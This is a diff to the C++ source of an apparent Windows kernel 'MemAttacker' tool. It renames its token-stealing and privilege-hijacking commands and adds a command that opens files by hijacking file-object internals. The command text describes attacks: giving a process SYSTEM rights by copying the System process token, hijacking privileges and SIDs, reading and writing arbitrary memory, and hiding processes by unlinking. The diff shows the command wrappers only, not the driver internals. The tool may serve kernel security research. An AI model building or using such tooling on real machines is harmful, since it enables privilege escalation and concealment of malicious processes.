@@ -14,7 +14,7 @@ namespace mem_attacker {
 	}
 
 	/*   */
-	bool MemAttacker::hijack_privs() {
+	bool MemAttacker::token_hijacking() {
 		HIJACK_PRIVS_DATA data = { 0 }; cin >> std::dec >> data.processID;
 		bool b_res =
 			scm_manager.send_ctrl_code(MEM_ATTACKER_HIJACK_PRIVS, (LPVOID)&data, sizeof HIJACK_PRIVS_DATA, NULL, 0, 0);
@@ -91,6 +91,10 @@ namespace mem_attacker {
 	bool MemAttacker::file_by_hijacking_fileobj() {
 		return ctl_files::open_file_by_hijacking_fileobj(scm_manager, MEM_ATTACKER_OPEN_BY_HIJACKING_FILEOBJ);
 	}
+
+    bool MemAttacker::file_by_hijacking_fileobj_internals() {
+        return ctl_files::open_file_by_hijacking_fileobj(scm_manager, MEM_ATTACKER_OPEN_BY_HIJACKING_FILEOBJ_INTERNALS);
+    }
 
 	bool MemAttacker::file_by_hijacking_filehandle() {
 		return ctl_files::open_file_by_hijacking_filehandle(scm_manager, MEM_ATTACKER_OPEN_BY_HIJACKING_FILEHANDLE);
@@ -335,9 +339,9 @@ namespace mem_attacker {
 		*/
 		
 // 		add_unique_command("hide", &mem_attacker::MemAttacker::hide_proc, " <ProcessId in dec> ' --  hide process with <ProcessId> by unlinking");
- 		add_unique_command("steal_token", &mem_attacker::MemAttacker::token_stealing, " <ProcessId in dec> ' --  set NT AUTHORITY\\SYSTEM for <ProcessId> by swap Token from System:4");
+ 		add_unique_command("token_stealing", &mem_attacker::MemAttacker::token_stealing, " <ProcessId in dec> ' --  stealing Token value from System:4 process");
 
-		add_unique_command("hijack_privs", &mem_attacker::MemAttacker::hijack_privs, " <ProcessId in dec> ' --  hijack privileges and SIDs from System:4");
+		add_unique_command("token_hijacking", &mem_attacker::MemAttacker::token_hijacking, " <ProcessId in dec> ' --  hijacking privileges and SIDs from System:4 process");
 
 		add_unique_command("read_byte", &mem_attacker::MemAttacker::read_1byte, " <Address>  ' -- read 1 byte from memory <Address>");
 		add_unique_command("write_byte", &mem_attacker::MemAttacker::write_1byte, " <Address> <Value in hex>' -- write 1 byte to memory <Address>");
@@ -358,6 +362,10 @@ namespace mem_attacker {
 		add_unique_command(ctl_files::f_open_by_hijacking_fileobj_command, 
 			&mem_attacker::MemAttacker::file_by_hijacking_fileobj,
 			ctl_files::f_open_by_hijacking_fileobj_descript);
+
+        add_unique_command(ctl_files::f_open_by_hijacking_fileobj_internals_command,
+            &mem_attacker::MemAttacker::file_by_hijacking_fileobj_internals,
+            ctl_files::f_open_by_hijacking_fileobj_internals_descript);
 
 		add_unique_command(ctl_files::f_open_by_hijacking_filehandle_command,
 			&mem_attacker::MemAttacker::file_by_hijacking_filehandle,
